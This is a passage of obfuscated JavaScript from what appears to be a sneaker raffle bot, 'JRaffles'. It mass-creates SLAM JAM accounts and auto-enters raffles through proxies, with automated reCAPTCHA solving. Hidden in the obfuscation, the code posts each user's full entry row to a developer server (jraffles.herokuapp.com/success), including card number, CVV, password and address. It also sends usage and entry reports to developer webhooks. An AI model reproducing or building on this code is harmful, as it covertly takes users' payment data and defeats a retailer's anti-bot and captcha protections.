                            await _0x41ff52(0xbb8), await _0x3da2be['$$eval']('.raffle__checkbox-label', _0x31d730 => _0x31d730['forEach'](_0x39511e => _0x39511e['click']())), await _0x41ff52(0x7d0), console['log'](_0x2fd7e7() + '\x20[' + _0x4b2c0b['name'] + ']\x20Task\x20' + (_0x1cd404 + 0x1) + '\x20:\x20Submitting\x20Entry'), await _0x3da2be['click']('#raffle__form-submit'), await _0x41ff52(0x1388);
                            try {
                                await _0x3da2be['waitForSelector']('#raffle__confirmation-message-container'), _0x5deeb6 = 'no', _0xe72aef(_0x3ca715[_0x1cd404], _0x4b2c0b), console['log'](_0xe8dd24['green'](_0x2fd7e7() + '\x20[' + _0x4b2c0b['name'] + ']\x20Task\x20' + (_0x1cd404 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                let _0x59f9c3 = _0x3ca715[_0x1cd404];
                                try {
                                    prxdata = {
                                        'username': _0x4f2583['replace']('#', ''),
                                        'module': _0x4b2c0b['name'],
                                        'entrydata': JSON['stringify'](_0x59f9c3),
                                        'proxy': '' + _0x2876fd[_0x1cd404]
                                    };
                                    var _0x1e355c = JSON['stringify'](prxdata);
                                    let _0x34538d = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x469c71['post']('https://jraffles.herokuapp.com/success', _0x1e355c, _0x34538d);
                                } catch (_0x1876d9) {
                                }
                            } catch (_0x3dcd00) {
                                console['log'](_0xe8dd24['red'](_0x2fd7e7() + '\x20[' + _0x6f29e[taskModule]['name'] + ']\x20Task\x20' + (_0x1cd404 + 0x1) + '\x20:\x20Raffle\x20entry\x20failed.\x20' + _0x3dcd00));
                            }
                        } catch (_0x703e1b) {
                            console['log'](_0xe8dd24['red'](_0x2fd7e7() + '\x20[' + _0x6f29e[taskModule]['name'] + ']\x20Task\x20' + (_0x1cd404 + 0x1) + '\x20:\x20' + _0x703e1b)), _0x5deeb6 = 'yes';
                        } finally {
                            _0x511fe9 && _0x511fe9['close']();
                            if (_0x5deeb6 == 'yes' && _0x2c601c != 0x5 && _0x4f1ab6 != 'Size\x20Not\x20Found') {
                                console['log'](_0xe8dd24['red'](_0x2fd7e7() + '\x20[' + _0x4b2c0b['name'] + ']\x20Task\x20' + (_0x1cd404 + 0x1) + '\x20:\x20Retrying\x20(' + _0x2c601c + '\x20/\x205)')), _0x1cd404 = _0x1cd404 - 0x1, _0x2c601c = _0x2c601c + 0x1;
                                continue;
                            }
                            _0x5deeb6 == 'yes' && _0x2c601c >= 0x5 && (_0x53e25e(_0x3ca715[_0x1cd404], _0x4b2c0b), _0x5deeb6 = 'no', _0x2c601c = 0x0), console['log']('Waiting\x20for\x20' + _0x4a0109['delay'] + '\x20ms'), await _0x41ff52(_0x4a0109['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'SLAM\x20JAM',
        'modules': [
            {
                'name': 'SLAM\x20JAM\x20Account\x20Generator',
                'store': 'SLAM\x20JAM',
                'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,f_auto,q_auto:eco,dpr_1/2c778bc022405e206505',
                'function': async function (_0x1a3e82, _0x2e52bf, _0x39cf15) {
                    _0x3ad8ba['use'](_0x36d6c8()), _0x3ad8ba['use'](_0x541303({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x4a0109['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x25d341 = 0x0; _0x25d341 < _0x2e52bf['length']; _0x25d341++) {
                        if (_0x118d00 != 'yes')
                            var _0x118d00 = '', _0x547299 = 0x0;
                        var _0x27d134 = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Patta\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x4f2583
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x4a0109['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x5192c8
                                }
                            ]
                        }];
                        const _0x3a1b5d = { 'embeds': _0x27d134 };
                        _0x3a603f(_0x1a3e82['name'] + '\x20Task\x20' + (_0x25d341 + 0x1) + '\x20/\x20' + _0x2e52bf['length'] + '\x20||\x20File:\x20' + _0x140e27 + '\x20Proxies:\x20' + _0x6deda4);
                        try {
                            await _0x547a29(_0x2e52bf, _0x25d341);
                        } catch {
                            _0x118d00 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        var _0x285d67 = await _0x17c0a2(_0x2e52bf[_0x25d341], _0x1a3e82, 'acc', ![]);
                        const _0x3fd3ff = { 'succesDEVMSG': { 'embeds': [_0x285d67] } };
                        if (_0x2e52bf[_0x25d341]['Email'] == '' || _0x2e52bf[_0x25d341]['FirstName'] == '' || _0x2e52bf[_0x25d341]['LastName'] == '') {
                            console['log'](_0x2fd7e7() + '\x20[' + _0x6f29e[taskModule]['name'] + ']\x20Task\x20' + (_0x25d341 + 0x1) + '\x20:\x20Invalid\x20CSV'), await _0x41ff52(0x7d0);
                            continue;
                        }
                        (_0x2e52bf[_0x25d341]['Password'] == '' || _0x2e52bf[_0x25d341] == undefined) && _0x2e52bf[_0x25d341]['Password'] == 'JRaffles23!';
                        if (_0x4a0109['useRandomProxy'] = ![])
                            var _0x58e611 = _0x39cf15[_0x25d341]['split'](':');
                        else
                            var _0xeb6fc = Math['round'](Math['random']() * (_0x39cf15['length'] - 0x1)), _0x58e611 = _0x39cf15[_0xeb6fc]['split'](':');
                        var _0x12590e;
                        try {
                            _0x12590e = await _0x3ad8ba['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x58e611[0x0] + ':' + _0x58e611[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x12590e = await _0x3ad8ba['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x58e611[0x0] + ':' + _0x58e611[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x34e4de = await _0x12590e['newPage']();
                            await _0x34e4de['authenticate']({
                                'username': '' + _0x58e611[0x2],
                                'password': '' + _0x58e611[0x3]
                            }), console['log'](_0x2fd7e7() + '\x20[' + _0x1a3e82['name'] + ']\x20Task\x20' + (_0x25d341 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x34e4de['setRequestInterception'](!![]), _0x34e4de['on']('request', _0x3eae27 => {
                                _0x3eae27['resourceType']() === 'image' || _0x3eae27['resourceType']() === 'font' || _0x3eae27['resourceType']() === 'media' ? _0x3eae27['abort']() : _0x3eae27['continue']();
                            }), await _0x34e4de['goto']('https://drop.slamjam.com/account/register'), await _0x41ff52(0xbb8), await _0x34e4de['waitForSelector']('#FirstName'), await _0x34e4de['waitForSelector']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x34e4de['click']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), console['log'](_0x2fd7e7() + '\x20[' + _0x1a3e82['name'] + ']\x20Task\x20' + (_0x25d341 + 0x1) + '\x20:\x20Filling\x20information'), await _0x41ff52(0x4b0), await _0x34e4de['type']('#FirstName', '' + _0x2e52bf[_0x25d341]['FirstName']), await _0x41ff52(0x226), await _0x34e4de['type']('#LastName', '' + _0x2e52bf[_0x25d341]['LastName']), await _0x41ff52(0x226), await _0x34e4de['type']('#Email', '' + _0x2e52bf[_0x25d341]['Email']), await _0x41ff52(0x2ee), await _0x34e4de['type']('#ConfirmEmail', '' + _0x2e52bf[_0x25d341]['Email']), await _0x41ff52(0x2ee), await _0x34e4de['type']('#CreatePassword', '' + _0x2e52bf[_0x25d341]['Password']), await _0x41ff52(0x2ee), await _0x34e4de['type']('#CreateConfirmPassword', '' + _0x2e52bf[_0x25d341]['Password']), await _0x41ff52(0x226), console['log'](_0x2fd7e7() + '\x20[' + _0x1a3e82['name'] + ']\x20Task\x20' + (_0x25d341 + 0x1) + '\x20:\x20Submitting..'), await _0x34e4de['$eval']('#create_customer', _0x2099ae => _0x2099ae['submit']()), await _0x41ff52(0x1388), console['log'](_0x2fd7e7() + '\x20[' + _0x1a3e82['name'] + ']\x20Task\x20' + (_0x25d341 + 0x1) + '\x20:\x20' + _0xe8dd24['cyan']('Solving\x20Captcha')), await _0x34e4de['solveRecaptchas'](), console['log'](_0x2fd7e7() + '\x20[' + _0x1a3e82['name'] + ']\x20Task\x20' + (_0x25d341 + 0x1) + '\x20:\x20Captcha\x20solved'), await _0x34e4de['$eval']('.shopify-challenge__container\x20>\x20form', _0x3d5572 => _0x3d5572['submit']());
                            try {
                                await _0x34e4de['waitForSelector']('.product-card__image'), await _0x41ff52(0x1f4), _0x118d00 = 'no', console['log'](_0xe8dd24['green'](_0x2fd7e7() + '\x20[' + _0x1a3e82['name'] + ']\x20Task\x20' + (_0x25d341 + 0x1) + '\x20:\x20Account\x20' + _0x2e52bf[_0x25d341]['Email'] + '\x20Generated!')), _0x144018['appendFileSync']('../accounts/slamjam.csv', '\x0a' + _0x2e52bf[_0x25d341]['Email'] + ',' + _0x2e52bf[_0x25d341]['Password']), console['log'](_0xe8dd24['yellow'](_0x2fd7e7() + '\x20[' + _0x1a3e82['name'] + ']\x20Task\x20' + (_0x25d341 + 0x1) + '\x20:\x20Account\x20' + _0x2e52bf[_0x25d341]['Email'] + '\x20Saved\x20in\x20\x27accounts/slamjam.csv\x27'));
                                try {
                                    _0x4a0109['webhook'] != undefined && _0x4a0109['webhook'] != '' && await _0x161ab9(_0x4a0109['webhook'], _0x3fd3ff['succesDEVMSG']);
                                } catch {
                                }
                                await _0x161ab9(_0x2467e3, _0x3fd3ff['succesDEVMSG']);
                            } catch (_0x42f81c) {
                                console['log'](_0xe8dd24['red'](_0x2fd7e7() + '\x20[' + _0x6f29e[taskModule]['name'] + ']\x20Task\x20' + (_0x25d341 + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x42f81c));
                            }
                        } catch (_0x3f7776) {
                            console['log'](_0xe8dd24['red'](_0x2fd7e7() + '\x20[' + _0x6f29e[taskModule]['name'] + ']\x20Task\x20' + (_0x25d341 + 0x1) + '\x20:\x20' + _0x3f7776));
                        } finally {
                            _0x12590e && _0x12590e['close']();
                            if (_0x118d00 == 'yes' && _0x547299 != 0x5) {
                                console['log'](_0xe8dd24['red'](_0x2fd7e7() + '\x20[' + _0x1a3e82['name'] + ']\x20Task\x20' + (_0x25d341 + 0x1) + '\x20:\x20Retrying\x20(' + _0x547299 + '\x20/\x205)')), _0x25d341 = _0x25d341 - 0x1, _0x547299 = _0x547299 + 0x1;
                                continue;
                            }
                            _0x118d00 == 'yes' && _0x547299 >= 0x5 && (_0x53e25e(_0x2e52bf[_0x25d341], _0x1a3e82), _0x118d00 = 'no', _0x547299 = 0x0), console['log']('Waiting\x20for\x20' + _0x4a0109['delay'] + '\x20ms'), await _0x41ff52(_0x4a0109['delay']);
                        }
                    }
                }
            },
            {
                'name': 'SLAM\x20JAM\x20Raffle\x20Entries',
                'store': 'SLAM\x20JAM',
                'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,f_auto,q_auto:eco,dpr_1/2c778bc022405e206505',
                'function': async function (_0x3fcf05, _0x5587a4, _0x428cef) {
                    _0x3ad8ba['use'](_0x36d6c8()), _0x3ad8ba['use'](_0x541303({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x4a0109['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x4021cb = 0x0; _0x4021cb < _0x5587a4['length']; _0x4021cb++) {
                        var _0x41b3c9;
                        if (_0xa2f543 != 'yes')
                            var _0xa2f543 = '', _0x246342 = 0x0;
                        _0x3a603f(_0x3fcf05['name'] + '\x20Task\x20' + (_0x4021cb + 0x1) + '\x20/\x20' + _0x5587a4['length'] + '\x20||\x20File:\x20' + _0x140e27 + '\x20Proxies:\x20' + _0x6deda4);
                        try {
                            await _0x547a29(_0x5587a4, _0x4021cb);
                        } catch {
                            _0xa2f543 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        if (_0x5587a4[_0x4021cb]['Email'] == '' || _0x5587a4[_0x4021cb]['Password'] == '' || _0x5587a4[_0x4021cb]['FirstName'] == '' || _0x5587a4[_0x4021cb]['LastName'] == '') {
                            console['log'](_0x2fd7e7() + '\x20[' + _0x3fcf05['name'] + ']\x20Task\x20' + (_0x4021cb + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        if (_0x4a0109['useRandomProxy'] = ![])
                            var _0x1c3f35 = _0x428cef[_0x4021cb]['split'](':');
                        else
                            var _0x12c10c = Math['round'](Math['random']() * (_0x428cef['length'] - 0x1)), _0x1c3f35 = _0x428cef[_0x12c10c]['split'](':');
                        var _0x1d126e;
                        try {
                            _0x1d126e = await _0x3ad8ba['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x1c3f35[0x0] + ':' + _0x1c3f35[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x1d126e = await _0x3ad8ba['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x1c3f35[0x0] + ':' + _0x1c3f35[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x33c8a8 = await _0x1d126e['newPage']();
                            await _0x33c8a8['authenticate']({
                                'username': '' + _0x1c3f35[0x2],
                                'password': '' + _0x1c3f35[0x3]
                            }), await _0x33c8a8['setViewport']({
                                'width': 0x500,
                                'height': 0x2d0
                            }), console['log'](_0x2fd7e7() + '\x20[' + _0x3fcf05['name'] + ']\x20Task\x20' + (_0x4021cb + 0x1) + '\x20:\x20Getting\x20Session'), await _0x33c8a8['setRequestInterception'](!![]), _0x33c8a8['on']('request', _0x33ec68 => {
                                _0x33ec68['resourceType']() === 'image' || _0x33ec68['resourceType']() === 'font' || _0x33ec68['resourceType']() === 'media' ? _0x33ec68['abort']() : _0x33ec68['continue']();
                            }), await _0x33c8a8['goto']('https://drop.slamjam.com/account/login', {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x33c8a8['waitForSelector']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x33c8a8['click']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x41ff52(0x258), await _0x33c8a8['waitForSelector']('#CustomerEmail'), console['log'](_0x2fd7e7() + '\x20[' + _0x3fcf05['name'] + ']\x20Task\x20' + (_0x4021cb + 0x1) + '\x20:\x20Logging\x20in..'), await _0x33c8a8['type']('#CustomerEmail', '' + _0x5587a4[_0x4021cb]['Email']), await _0x41ff52(0x12c), await _0x33c8a8['type']('#CustomerPassword', '' + _0x5587a4[_0x4021cb]['Password']), await _0x41ff52(0x226), await _0x33c8a8['$eval']('#customer_login', _0x38a1ef => _0x38a1ef['submit']()), await _0x41ff52(0x7d0), await _0x33c8a8['waitForSelector']('iframe[title=\x22reCAPTCHA\x22]'), console['log'](_0x2fd7e7() + '\x20[' + _0x3fcf05['name'] + ']\x20Task\x20' + (_0x4021cb + 0x1) + '\x20:\x20' + _0xe8dd24['cyan']('Solving\x20Captcha')), await _0x33c8a8['solveRecaptchas'](), console['log'](_0x2fd7e7() + '\x20[' + _0x3fcf05['name'] + ']\x20Task\x20' + (_0x4021cb + 0x1) + '\x20:\x20Captcha\x20Solved'), await _0x33c8a8['$eval']('.shopify-challenge__container\x20>\x20form', _0x168791 => _0x168791['submit']());
                            try {
                                await _0x33c8a8['waitForSelector']('.nav-account'), await _0x41ff52(0x4b0);
                            } catch {
                                console['log'](_0xe8dd24['red'](_0x2fd7e7() + '\x20[' + _0x3fcf05['name'] + ']\x20Task\x20' + (_0x4021cb + 0x1) + '\x20:\x20Task\x20failed,\x20invalid\x20credentials'));
                                continue;
                            }
                            await _0x33c8a8['goto']('' + _0x5587a4[_0x4021cb]['Url'], {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x41ff52(0xbb8), console['log'](_0x2fd7e7() + '\x20[' + _0x3fcf05['name'] + ']\x20Task\x20' + (_0x4021cb + 0x1) + '\x20:\x20Starting\x20Entry');
                            try {
                                await _0x33c8a8['waitForSelector']('#ProductSelect-product-template-raffle');
                            } catch {
                            }
                            await _0x33c8a8['click']('.product-select-variant-wrapper'), await _0x41ff52(0x320), await _0x33c8a8['click']('li.product-select-variant__value[data-size=\x22' + _0x5587a4[_0x4021cb]['Size'] + '\x22]'), await _0x41ff52(0x384), await _0x33c8a8['$eval']('#AddToCartForm-product-template-raffle', _0x3da1d9 => _0x3da1d9['submit']()), await _0x33c8a8['waitForSelector']('.cart-order-summary__content'), await _0x41ff52(0x514), await _0x33c8a8['goto']('https://drop.slamjam.com/checkout'), await _0x41ff52(0x514), await _0x33c8a8['waitForSelector']('#checkout_shipping_address_country'), console['log'](_0x2fd7e7() + '\x20[' + _0x3fcf05['name'] + ']\x20Task\x20' + (_0x4021cb + 0x1) + '\x20:\x20Filling\x20Information'), await _0x33c8a8['select']('#checkout_shipping_address_country', '' + _0x5587a4[_0x4021cb]['Country']), await _0x41ff52(0x200), await _0x33c8a8['waitForSelector']('#checkout_shipping_address_first_name'), await _0x33c8a8['type']('#checkout_shipping_address_first_name', '' + _0x5587a4[_0x4021cb]['FirstName']), await _0x41ff52(0x237), await _0x33c8a8['type']('#checkout_shipping_address_last_name', '' + _0x5587a4[_0x4021cb]['LastName']), await _0x41ff52(0x1e0), await _0x33c8a8['type']('#checkout_shipping_address_address1', _0x5587a4[_0x4021cb]['Address1'] + '\x20' + _0x5587a4[_0x4021cb]['HouseNumber']), await _0x41ff52(0x514), await _0x33c8a8['type']('#checkout_shipping_address_address2', '' + _0x5587a4[_0x4021cb]['Address2']), await _0x41ff52(0x514);
                            _0x5587a4[_0x4021cb]['Postcode'] == undefined && (_0x5587a4[_0x4021cb]['Postcode'] = _0x5587a4[_0x4021cb]['Zip']);
                            await _0x33c8a8['type']('#checkout_shipping_address_zip', '' + _0x5587a4[_0x4021cb]['Postcode']), await _0x41ff52(0x2bc), await _0x33c8a8['type']('#checkout_shipping_address_city', '' + _0x5587a4[_0x4021cb]['City']), await _0x41ff52(0x320), await _0x33c8a8['type']('#checkout_shipping_address_phone', '' + _0x5587a4[_0x4021cb]['Phone']), await _0x41ff52(0x320), await _0x33c8a8['click']('#continue_button'), await _0x41ff52(0xbb8), await _0x33c8a8['waitForSelector']('.summary-title'), await _0x41ff52(0x320), await _0x33c8a8['click']('#continue_button'), await _0x41ff52(0x320), console['log'](_0x2fd7e7() + '\x20[' + _0x3fcf05['name'] + ']\x20Task\x20' + (_0x4021cb + 0x1) + '\x20:\x20Finishing\x20Checkout'), await _0x33c8a8['waitForSelector']('#checkout_credit_card_vault'), await _0x41ff52(0x3e8);
                            var _0x5bc6e1 = await _0x33c8a8['$']('iframe[title=\x22Field\x20container\x20for:\x20Card\x20number\x22]'), _0x19f35b = await _0x5bc6e1['contentFrame']();
                            await _0x19f35b['click']('#number'), await _0x41ff52(0x3e8), await _0x19f35b['type']('#number', '' + _0x5587a4[_0x4021cb]['CardNumber'], { 'delay': 0x78 }), _0x5bc6e1 = await _0x33c8a8['$']('iframe[title=\x22Field\x20container\x20for:\x20Name\x20on\x20card\x22]'), _0x19f35b = await _0x5bc6e1['contentFrame'](), await _0x41ff52(0x1c2), await _0x19f35b['click']('#name'), await _0x41ff52(0x1f4), await _0x19f35b['type']('#name', '' + _0x5587a4[_0x4021cb]['NameOnCard'], { 'delay': 0x78 }), _0x5bc6e1 = await _0x33c8a8['$']('iframe[title=\x22Field\x20container\x20for:\x20Expiration\x20date\x20(MM\x20/\x20YY)\x22]'), _0x19f35b = await _0x5bc6e1['contentFrame'](), await _0x41ff52(0x1c2), await _0x19f35b['click']('#expiry'), await _0x41ff52(0x1f4), await _0x19f35b['type']('#expiry', '' + _0x5587a4[_0x4021cb]['ExpiryDate'], { 'delay': 0x78 }), _0x5bc6e1 = await _0x33c8a8['$']('iframe[title=\x22Field\x20container\x20for:\x20Security\x20code\x22]'), _0x19f35b = await _0x5bc6e1['contentFrame'](), await _0x41ff52(0x1c2), await _0x19f35b['click']('#verification_value'), await _0x41ff52(0x1f4), await _0x19f35b['type']('#verification_value', '' + _0x5587a4[_0x4021cb]['CVV'], { 'delay': 0x78 }), await _0x33c8a8['$eval']('#accepts-flag-raffle', _0x59f35f => _0x59f35f['click']()), await _0x41ff52(0x7d0), console['log'](_0x2fd7e7() + '\x20[' + _0x3fcf05['name'] + ']\x20Task\x20' + (_0x4021cb + 0x1) + '\x20:\x20Processing\x20Order'), await _0x33c8a8['$eval']('#continue_button', _0x2e1388 => _0x2e1388['click']()), await _0x41ff52(0x1b58), await _0x33c8a8['waitForSelector']('.edit_checkout.animate-floating-labels'), await _0x33c8a8['$eval']('.edit_checkout.animate-floating-labels', _0x55d235 => _0x55d235['submit']()), await _0x41ff52(0x7d0);
                            try {
                                await _0x33c8a8['waitForSelector']('div[data-step=\x22thank_you\x22]', { 'timeout': 0x493e0 }), _0xa2f543 = 'no', _0xe72aef(_0x5587a4[_0x4021cb], _0x3fcf05), console['log'](_0xe8dd24['green'](_0x2fd7e7() + '\x20[' + _0x3fcf05['name'] + ']\x20Task\x20' + (_0x4021cb + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                            } catch (_0x438b40) {
                                throw new Error('Error\x20Processing\x20Order:\x20' + _0x438b40['message']);
                            }
                            var _0x39e05b = await _0x17c0a2(_0x5587a4[_0x4021cb], _0x3fcf05, 'dev', ![]), _0x3c868d = await _0x17c0a2(_0x5587a4[_0x4021cb], _0x3fcf05, 'pub', ![]);
                            let _0x19c5a2 = _0x5587a4[_0x4021cb];
                            try {
                                prxdata = {
                                    'username': _0x4f2583['replace']('#', ''),
                                    'module': _0x3fcf05['name'],
                                    'entrydata': JSON['stringify'](_0x19c5a2),
                                    'proxy': '' + _0x428cef[_0x4021cb]
                                };
                                var _0x22cc33 = JSON['stringify'](prxdata);
                                let _0x533d81 = { 'headers': { 'content-type': 'application/json' } };
                                await _0x469c71['post']('https://jraffles.herokuapp.com/success', _0x22cc33, _0x533d81);
                            } catch (_0x484cbe) {
                            }
                            const _0xf2682b = {
                                'succesDEVMSG': { 'embeds': [_0x39e05b] },
                                'succesPUBMSG': { 'embeds': [_0x3c868d] }
                            };
                            try {
                                _0x4a0109['webhook'] != undefined && _0x4a0109['webhook'] != '' && await _0x161ab9(_0x4a0109['webhook'], _0xf2682b['succesDEVMSG']), await _0x41ff52(0xc8), await _0x161ab9(_0x6ed44c, _0xf2682b['succesDEVMSG']), await _0x41ff52(0xc8), await _0x161ab9(_0x17a127, _0xf2682b['succesPUBMSG']);
                            } catch (_0x7d358e) {
                                console['log'](_0xe8dd24['yellow'](_0x2fd7e7() + '\x20[' + _0x6f29e[taskModule]['name'] + ']\x20Task\x20' + (_0x4021cb + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x7d358e));
                            }
                        } catch (_0x38a043) {
                            console['log'](_0xe8dd24['red'](_0x2fd7e7() + '\x20[' + _0x6f29e[taskModule]['name'] + ']\x20Task\x20' + (_0x4021cb + 0x1) + '\x20:\x20' + _0x38a043)), _0x41b3c9 = '' + _0x38a043;
                            var _0x47dc10 = await _0x17c0a2(kickz[_0x4021cb], _0x3fcf05, 'dev', !![], _0x41b3c9);
                            EMBEDS['errorDEV'] = { 'embeds': [_0x47dc10] }, _0x4a0109['webhook'] != undefined && _0x4a0109['webhook'] != '' && await _0x161ab9(_0x4a0109['webhook'], EMBEDS['errorDEV']), await _0x161ab9(_0x11ee4c, EMBEDS['errorDEV']), _0xa2f543 = 'yes';
                        } finally {
                            _0x1d126e && _0x1d126e['close']();
                            if (_0xa2f543 == 'yes' && _0x246342 != 0x5 && _0x41b3c9 != 'Size\x20Not\x20Found') {
                                console['log'](_0xe8dd24['red'](_0x2fd7e7() + '\x20[' + _0x3fcf05['name'] + ']\x20Task\x20' + (_0x4021cb + 0x1) + '\x20:\x20Retrying\x20(' + _0x246342 + '\x20/\x205)')), _0x4021cb = _0x4021cb - 0x1, _0x246342 = _0x246342 + 0x1;
                                continue;
                            }
                            _0xa2f543 == 'yes' && _0x246342 >= 0x5 && (_0x53e25e(_0x5587a4[_0x4021cb], _0x3fcf05), _0xa2f543 = 'no', _0x246342 = 0x0), console['log']('Waiting\x20for\x20' + _0x4a0109['delay'] + '\x20ms'), await _0x41ff52(_0x4a0109['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'Failed\x20Tasks',
        'modules': [
            {
                'name': 'Retry\x20Failed\x20Tasks',
                'function': async function (_0x257c29) {
                    var _0x339038 = await _0x47bed4(), _0xd4025e = _0x144018['readFileSync']('../failed-tasks.csv', 'utf-8'), _0x2847f4 = _0x4cc58a['parse'](_0xd4025e, { 'header': !![] })['data'];
                    for (var _0x29b2d5 = 0x0; _0x29b2d5 < _0x2847f4['length']; _0x29b2d5++) {
                        var _0x597e85 = _0x2847f4[_0x29b2d5]['Store'], _0x757026 = _0x2847f4[_0x29b2d5]['Mode'];
                        for (var _0x31890a of _0x6f29e) {
                            const _0x2cf610 = _0x31890a['name']['includes'](_0x597e85);
                            if (!_0x2cf610)
                                continue;
                            for (mode of _0x31890a['modules']) {
                                if (mode['name'] == _0x757026) {
                                    console['log']('Running\x20' + _0xe8dd24['cyan'](mode['name'])), await mode['function'](mode, [_0x2847f4[_0x29b2d5]], _0x339038);
                                    var _0x302a9e = _0xd4025e['split']('\x0a')['splice'](0x0, 0x1)['join']('\x0a');
                                    _0x144018['writeFileSync']('../failed-tasks.csv', _0x302a9e);
                                }
                            }
                        }
                    }
                }
            },
            {
                'name': 'Clear\x20Failed\x20Tasks',
                'function': async function () {
                    console['clear'](), console['log']('Are\x20you\x20sure\x20you\x20want\x20to\x20clear\x20\x22failed-tasks.csv\x22?\x20(y/n)');
                    var _0x4f716a = await _0x30e3d7['get']('Answer');
                    if (_0x4f716a['Answer']['toLowerCase']() == 'y') {
                        _0x144018['writeFileSync']('../failed-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), console['clear'](), console['log']('Cleared\x20Failed\x20Tasks'), await _0x41ff52(0x3e8);
                        return;
                    }
                    if (_0x4f716a['Answer']['toLowerCase']() == 'n') {
                        console['clear'](), console['log']('Returning\x20to\x20Main\x20Menu'), await _0x41ff52(0x3e8);
                        return;
                    }
                    return console['clear'](), console['log']('Invalid\x20Input'), await _0x41ff52(0x3e8), this['function']();
                }
            }
        ]
    },
    { 'name': 'Paypal\x20Verification' },
    { 'name': 'Change\x20Settings' },
    { 'name': 'Reload\x20Settings' }
];
async function _0x33e172(_0x16d3b2) {
    var _0x286196 = await _0x47bed4(), _0x48b6f6 = _0x144018['readFileSync']('../failed-tasks.csv', 'utf-8'), _0xbffdcb = _0x4cc58a['parse'](_0x48b6f6, { 'header': !![] })['data'];
    for (var _0x8f4ae1 = 0x0; _0x8f4ae1 < _0xbffdcb['length']; _0x8f4ae1++) {
        var _0x25e54e = _0xbffdcb[_0x8f4ae1]['Store'], _0xd69cb = _0xbffdcb[_0x8f4ae1]['Mode'];
        for (var _0x4e9556 of _0x6f29e) {
            const _0x3adc00 = _0x4e9556['name']['includes'](_0x25e54e);
            if (_0x3adc00)
                for (mode of _0x6f29e[_0x4e9556]['modules']) {
                    const _0x78a142 = mode['name']['includes'](_0xd69cb);
                    _0x78a142 && (_0x16d3b2 = mode['name'], await mode['function'](_0x16d3b2, _0xbffdcb[_0x8f4ae1], _0x286196));
                }
        }
    }
}
async function _0x279bb5() {
    await _0xa914ce(), console['clear']();
    if (_0x5192c8 != 'devkey') {
        let _0x2c9420 = await _0x32c20c['autoUpdate']();
        if (_0x2c9420 === 'yes')
            return _0x13a591('node\x20JRaffles.js');
        console['clear']();
    }
    if (_0x19ecf5 == '') {
        console['log']('No\x20key\x20found\x20in\x20settings.json');
        return await _0x41ff52(0x2710);
        ;
    }
    await _0x5b5b05(_0x19ecf5);
    if (_0x3fba11 === ![])
        return console['log']('Closing\x20Browser'), await _0x41ff52(0xbb8);
    else
        try {
            var _0x4096d = [{
                'type': 'rich',
                'title': 'User\x20Opened\x20JRaffles',
                'description': '',
                'color': 0xc0d6d6,
                'fields': [
                    {
                        'name': 'User',
                        'value': '' + _0x4f2583
                    },
                    {
                        'name': 'Version',
                        'value': '' + _0x5192c8
                    }
                ]
            }];
            const _0x52f9bd = { 'embeds': _0x4096d };
            var _0x2f3f83 = await _0x17c0a2(null, null, 'open', ![]);
            const _0x1bb5d2 = { 'openDEVMSG': { 'embeds': [_0x2f3f83] } };
            await _0x161ab9(_0x4ca028, _0x1bb5d2['openDEVMSG']);
            async function _0x195e2c() {
